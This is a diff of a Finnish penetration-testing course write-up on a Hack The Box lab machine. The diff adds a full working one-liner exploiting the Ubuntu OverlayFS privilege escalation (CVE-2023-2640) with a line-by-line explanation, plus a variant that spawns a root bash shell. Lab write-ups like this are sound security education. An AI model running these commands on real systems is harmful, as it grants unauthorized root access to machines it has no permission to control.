@@ -1,6 +1,6 @@
 # Harjoitus 1: Kybertappoketju
 Kurssi: https://terokarvinen.com/tunkeutumistestaus/ \
-Tehtävänanto: https://terokarvinen.com/palvelinten-hallinta/#h1-viisikko
+Tehtävänanto: https://terokarvinen.com/tunkeutumistestaus/#h1-kybertappoketju
 
 ## x) Lue/katso/kuuntele ja tiivistä 
 **Herrasmieshakkerit tai Darknet Diaries, yksi vapaavalintainen jakso jommasta kummasta**
@@ -27,7 +27,6 @@ Tehtävänanto: https://terokarvinen.com/palvelinten-hallinta/#h1-viisikko
 Minulta löytyi ylimääräinen kannettava, joka on vain tällä kurssilla käytössä, joten asensin Kalin suoraan tämän raudalle. Asennuskuvana toimi [kali-linux-2026.1-installer-amd64.iso](https://cdimage.kali.org/kali-2026.1/kali-linux-2026.1-installer-amd64.iso). Asennuksen kanssa ei ollut minkäänlaisia ongelmia.
 
 ## b) Irrota Kali-virtuaalikone verkosta. Todista testein, että kone ei saa yhteyttä Internetiin (esim. 'ping 8.8.8.8')
-
 
 
 ## c) Porttiskannaa 1000 tavallisinta tcp-porttia omasta koneestasi (nmap -T4 -A localhost). Selitä komennon paramterit. Analysoi ja selitä tulokset.
@@ -552,7 +551,21 @@ Tässä kohtaa lähdin Googlailemaan järjestelmän haavoittuvuuksia. SSH:n bann
 
 <img width="1070" height="1163" alt="image" src="https://github.com/user-attachments/assets/79fe9c45-cc0f-49d0-80be-242af078dd25" />
 
-Kyseiselle Ubuntun kernelille näyttäisi löytyvän useampia privilege escalation -haavoittuvuuksia, joista dokumentoiduin oli [CVE-2023-2640](https://ubuntu.com/security/CVE-2023-2640). Täman haavoittuvuuden testaukseen löytyi redditistä komento. (https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/).
+Kyseiselle Ubuntun kernelille näyttäisi löytyvän useampia privilege escalation -haavoittuvuuksia, joista dokumentoiduimpia oli [CVE-2023-2640](https://ubuntu.com/security/CVE-2023-2640). Täman haavoittuvuuden hyödyntämiseen löytyi redditistä komento, joka antaa python-binäärille root-oikeudet. Komento tulostaa rootin uid:n jos järjestelmä on haavoittuvainen.
+```
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
+setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'"
+```
+(https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/).
+
+* `unshare -rm`: Luo uuden user namespacen rootille ja mountaa sen
+* `sh -c "mkdir l u w m && cp /u*/b*/p*3 l/`: Luo hakemistot l, u, w, m ja kopioi python3 binäärin hakemistoon l
+* `setcap cap_setuid+eip l/python3`: Antaa l/python3 binäärille kyvykkyyden vaihtaa uid:tä
+* `mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m`: Mounttaa u-filesystemin l-fs:n päälle käyttäen w-hakemistoa työhakemistona, tästä syntynyt filesystem mountataan u-hakemistoon
+* `touch m/*`: Luo tyhjän tiedoston jokaista m-hakemistossa sijaitsevaa tiedostoa kohden. Bugi tapahtuu tässä, `cap_setuid` kopioituu upperdir:iin ilman pudotusta, eli valittu binääri (`/usr/bin/python3`) pääse vaihtamaan uid:tä.
+* `u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'`: Ajetaan u/python3 binääri, vaihdetaan uid ja tulostetaan se.
+* 
+(https://medium.com/@0xrave/ubuntu-gameover-lay-local-privilege-escalation-cve-2023-32629-and-cve-2023-2640-7830f9ef204a)
 
 Ajoin komennon ja se antoi pythonin ajaa pääkäyttäjänä.
 
@@ -566,14 +579,23 @@ Huomasin, että python ei automattiisesti aja pääkäyttäjänä ja vaihdettuan
 
 <img width="835" height="227" alt="image" src="https://github.com/user-attachments/assets/596c8531-5350-4372-ac78-6c0650a9e4ce" />
 
-Kun pythonin sai siirrettyä rootiksi, lipun sai tulostettua `/root`-hakemistosta read()-metodilla.
+Kun pythonin sai siirrettyä rootiksi, lipun sai tulostettua `/root`-hakemistosta read()-metodilla. Mahdollisen hyökkäyksen jatkamiseksi olisi hyödyllistää käynnistää uusi bash-shelli rootina, `u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")`
 
 <img width="1377" height="583" alt="image" src="https://github.com/user-attachments/assets/0ba1f946-8425-419b-9d75-c88012bcd09e" />
 
 Task 8 ei hyväksynyt minkään käyttämäni binäärin polkua vastaukseksi, joten ilmeisesti oletettu ratkaisu olisi hyödyntänyt jotain muuta haavoittuvuutta koneessa. Tärkeintä kuitenkin on, että liput löytyivät.
 
 ## Lähteet
+https://terokarvinen.com/tunkeutumistestaus/#h1-kybertappoketju
+
+https://cdimage.kali.org/kali-2026.1/kali-linux-2026.1-installer-amd64.iso
 
 https://nmap.org/book/man-performance.html
 
+https://app.hackthebox.com/machines/Cap
+
 https://portswigger.net/web-security/access-control/idor
+
+https://medium.com/@0xrave/ubuntu-gameover-lay-local-privilege-escalation-cve-2023-32629-and-cve-2023-2640-7830f9ef204a
+
+https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/
